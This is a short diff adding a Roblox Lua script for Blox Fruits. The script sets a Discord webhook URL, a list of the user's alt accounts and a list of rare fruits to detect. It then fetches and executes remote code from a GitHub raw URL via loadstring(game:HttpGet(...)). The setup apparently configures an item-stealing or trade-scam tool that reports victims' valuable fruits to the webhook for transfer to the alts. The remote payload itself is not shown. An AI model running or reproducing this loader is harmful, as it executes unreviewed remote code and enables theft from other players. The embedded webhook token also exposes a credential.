@@ -1,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1360891353411747990/iPecBNJ7Hicsd7Q1c32QSG2cuCASODY2jHs0Z-wi5qIEchHBgJSRrWhYteO60C0SrGpV" -- << Your Webhook
+Usernames = {"mdfmdgfdskfruit"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough"} -- << Fruits you want the script to detect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrektl/stuFF/refs/heads/main/wowowo"))()
